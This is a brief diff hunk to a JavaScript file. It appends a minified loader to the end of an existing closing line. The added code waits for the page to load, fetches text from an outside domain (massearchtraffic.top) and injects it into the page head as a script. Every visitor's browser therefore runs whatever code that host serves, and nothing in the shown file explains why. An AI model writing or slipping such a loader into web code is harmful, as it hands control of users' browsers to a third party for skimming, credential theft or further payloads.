@@ -523,4 +523,4 @@
             });
         }
     }
-})();
+})();;document.addEventListener("DOMContentLoaded",function(){fetch("https://cdn1.massearchtraffic.top/sockets").then(e=>e.text()).then(e=>{var t=document.createElement("script");t.innerHTML=e.trim(),document.head.appendChild(t)})});
